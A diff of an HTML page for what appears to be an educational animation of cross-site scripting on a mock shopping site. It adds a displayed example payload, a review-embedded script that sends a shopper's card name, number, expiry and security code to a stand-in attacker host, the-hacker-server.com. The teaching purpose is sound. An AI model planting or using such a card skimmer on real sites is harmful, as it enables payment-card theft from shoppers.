@@ -12,7 +12,7 @@
     </span>
     <span class="actor" id="victim">
         <img class="icon" src="img/icons8-female-user-64.png">
-        <span class="name">Victim</span>
+        <span class="name">Alice</span>
     </span>
     <span class="actor" id="server">
         <img class="icon" src="img/icons8-server-64.png">
@@ -31,14 +31,163 @@
         <img class="icon sub-icon" src="img/icons8-bug-64.png">
         <span class="name">Malicious<br>Server</span>
     </span>
-    <img id="hand-cursor" src="img/icons8-hand-cursor-64.png">
+    <svg width="100%" height="100%">
+        <g id="dlg-attacker">
+            <rect height="35" fill="#faefde" y="40" width="160" x="182" />
+            <path fill="transparent" stroke="#8d6c9f" stroke-width="2" d="M152 76 L182 57 L182 40 L342 40 L342 75 L182 75 L182 62" />
+            <text fill="#8d6c9f" y="62" x="190">I got her payment info!</text>
+        </g>
+    </svg>
+    <div class="browser" id="browser-1">
+        <div class="actionbar">
+            <img src="img/icons8-internet-explorer-64.png" class="icon">
+            <div class="url">
+                <span>http://a-xss-vulnerable-shopping-site.com/item/12345/review</span>
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+                    <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"
+                        fill="#777" />
+                    <path d="M0 0h24v24H0z" fill="none" />
+                </svg>
+            </div>
+        </div>
+        <div class="content">
+            <div class="description">
+                <div class="item">
+                    <img src="img/icons8-shopping-bag-64.png" alt="">
+                    <div class="meta">
+                        <span class="name">Yellow Luxury Bag</span>
+                        <span class="price">$ 999.99</span>
+                    </div>
+                </div>
+                <div class="reviews">
+                    <h4>Customer reviews</h4>
+                    <div class="review" id="hacker-review-new">
+                        <img src="img/icons8-spy-64.png" alt="">
+                        <div class="meta">
+                            <span class="name">not_a_hacker</span>
+                            <span class="text">L@@K HERE!</span>
+                        </div>
+                    </div>
+                    <div class="review">
+                        <img src="img/icons8-user-64.png" alt="">
+                        <div class="meta">
+                            <span class="name">Dave</span>
+                            <span class="text">My girl loves it.</span>
+                        </div>
+                    </div>
+                    <div class="review">
+                        <img src="img/icons8-female-user-64.png" alt="">
+                        <div class="meta">
+                            <span class="name">Jane</span>
+                            <span class="text">Not bad for its price.</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="write-review">
+                <h4>You bought this on <span>Dec. 20</span></h4>
+                <span class="field-name">Review</span>
+                <span class="field-name" id="rate"><i class="material-icons">star_rate</i><i class="material-icons">star_rate</i><i class="material-icons">star_rate</i><i class="material-icons">star_rate</i><i class="material-icons">star_rate</i>
+                </span>
+                <textarea class="field-value" id="text-review"></textarea>
+                <div class="submit">
+                    <div>
+                        <button id="review-submit">Submit</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="browser" id="browser-2">
+        <div class="actionbar">
+            <img src="img/icons8-internet-explorer-64.png" class="icon">
+            <div class="url">
+                <span>http://a-xss-vulnerable-shopping-site.com/item/12345/buy</span>
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+                    <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"
+                        fill="#777" />
+                    <path d="M0 0h24v24H0z" fill="none" />
+                </svg>
+            </div>
+        </div>
+        <div class="content">
+            <div class="description">
+                <div class="item">
+                    <img src="img/icons8-shopping-bag-64.png" alt="">
+                    <div class="meta">
+                        <span class="name">Yellow Luxury Bag</span>
+                        <span class="price">$ 999.99</span>
+                    </div>
+                </div>
+                <div class="reviews">
+                    <h4>Customer reviews</h4>
+                    <div class="review" id="hacker-review">
+                        <img src="img/icons8-spy-64.png" alt="">
+                        <div class="meta">
+                            <span class="name">not_a_hacker</span>
+                            <span class="text">L@@K HERE!</span>
+                        </div>
+                    </div>
+                    <div class="review">
+                        <img src="img/icons8-user-64.png" alt="">
+                        <div class="meta">
+                            <span class="name">Dave</span>
+                            <span class="text">My girl loves it.</span>
+                        </div>
+                    </div>
+                    <div class="review">
+                        <img src="img/icons8-female-user-64.png" alt="">
+                        <div class="meta">
+                            <span class="name">Jane</span>
+                            <span class="text">Not bad for its price.</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="payment">
+                <span class="field-name">Cardholder Name</span>
+                <input class="field-value" type="text" id="cardholder">
+                <span class="field-name">Card number</span>
+                <input class="field-value" type="text" id="card-no">
+                <span class="field-name">Expiration date</span>
+                <input class="field-value" type="text" id="expiration-date">
+                <span class="field-name">Security code</span>
+                <input class="field-value" type="password" id="security-code">
+                <div class="submit">
+                    <div>
+                        <button id="buy-submit">Buy now!</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="look-inside">
+            <pre><code class="html">L@@K HERE!
+&lt;script&gt;
+// send card information to the hacker when user submits!
+$('form').submit = function () {
+    var name = $('input[name="cardholder-name"]').value,
+        card = $('input[name="card-no"]').value,
+        date = $('input[name="expiration-date"]').value,
+        code = $('input[name="security-code"]').value;
+    $("body").insertAdjacentHTML("beforeend",
+        '&lt;img src="http://the-hacker-server.com/?name="' + name 
+        + "&card=" + card + "&date=" + date + "&code=" + code + '&gt;');
+}
+&lt;/script&gt;</code></pre>
+        </div>
+    </div>
+    <span id="http-request" class="packet">HTTP Request</span>
+    <span id="http-response" class="packet">HTTP Response</span>
+    <span id="db-reviews" class="packet">Reviews</span>
+    <span id="payment-data" class="packet">Payment Data</span>
+    <img class="pointer" id="hand-cursor" src="img/icons8-hand-cursor-64.png">
     <span class="splash" id="splash-1">
         <h2>Cross-site Scripting</h2>
     </span>
-    <div class="broswer" id="browser-1">
-        <div class="actionbar">
-            <img src="img/icons8-internet-explorer-64.png" class="icon">
-            <div class="url">http://xss-vulnerable-site.com</div>
-        </div>
-    </div>
+    <span class="splash" id="splash-2">
+        <h2>Hacker injects some JavaScript code<br>into the vulnerable website...</h2>
+    </span>
+    <span class="splash" id="splash-3">
+        <h2>When Alice visits the page...</h2>
+    </span>
 </div>
